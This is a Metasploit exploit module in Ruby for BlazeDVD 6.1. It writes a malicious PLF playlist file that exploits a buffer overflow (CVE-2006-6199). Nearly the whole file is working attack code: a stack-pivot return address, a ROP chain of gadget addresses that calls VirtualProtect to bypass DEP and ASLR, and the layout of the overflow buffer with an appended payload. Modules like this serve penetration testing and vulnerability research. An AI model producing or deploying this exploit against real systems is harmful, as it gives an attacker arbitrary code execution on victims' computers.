##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'BlazeDVD 6.1 PLF Exploit DEP/ASLR Bypass',
      'Description'  => %q{
          This module updates an existing MSF module originally written for BlazeDVD 5.1. The new module 
          will bypass DEP and ASLR on version 6. The original vulnerability is due to the handling of 
          specially crafted PLF files. Exploiting this allows us to execute arbitrary code running under 
          the context of the user.
      },
      'License'    => MSF_LICENSE,
      'Author'    => 
        [
          'Gjoko Krstic',  # Original discovery
          'Craig Freyman @cd1zz',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '30770' ],
          [ 'CVE', '2006-6199' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/6217/' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/13905/' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/9329/' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/16618/' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', 
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00\x0a\x1a\x2f\x3a\x5c", 
          'DisableNops' => true,
          'StackAdjustment' => -3500
        },

      'Targets'    =>
        [
          [ 'win',
            {
              'Ret'     =>  0x6030ef6c,# : {pivot 2352 / 0x930} :  # POP ESI # ADD ESP,92C # RETN
              'Offset'  =>  872
            }
          ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Aug 10 2008',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf']),], self.class)

  end

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x640258bf,  # POP EAX # RETN [MediaPlayerCtrl.dll] 
      0x10011108,  # ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]
      0x6033d8be,  # MOV ESI,DWORD PTR DS:[EAX] # RETN [Configuration.dll] 
      0x60327f7f,  # POP EBP # RETN [Configuration.dll] 
      0x616069a1,  # & push esp #  ret 04 [EPG.dll]
      0x60335f98,  # POP EAX # RETN [Configuration.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x6404c4c3,  # NEG EAX # RETN [MediaPlayerCtrl.dll] 
      0x64016676,  # XCHG EAX,EBX # RETN [MediaPlayerCtrl.dll] 
      0x6410948f,  # POP EAX # RETN [NetReg.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x6033b0eb,  # NEG EAX # RETN [Configuration.dll] 
      0x61608ba2,  # XCHG EAX,EDX # RETN [EPG.dll] 
      0x6033d975,  # POP ECX # RETN [Configuration.dll] 
      0x6411c001,  # &Writable location [NetReg.dll]
      0x6410a85d,  # POP EDI # RETN [NetReg.dll] 
      0x6160b805,  # RETN (ROP NOP) [EPG.dll]
      0x6402c108,  # POP EAX # RETN [MediaPlayerCtrl.dll] 
      0x90909090,  # nop
      0x6033d886,  # PUSHAD # RETN [Configuration.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end

  def exploit
    rop_chain = create_rop_chain()
    stack_adjust = "\x81\xc4\x24\xfa\xff\xff"
    buf = ''
    buf << make_nops(target['Offset'])
    buf << [target.ret].pack('V')
    buf << make_nops(8) #filler for stack pivot
    buf << rop_chain
    buf << stack_adjust
    buf << payload.encoded
    buf << make_nops(5000 - buf.length)

    file_create(buf)

  end
end
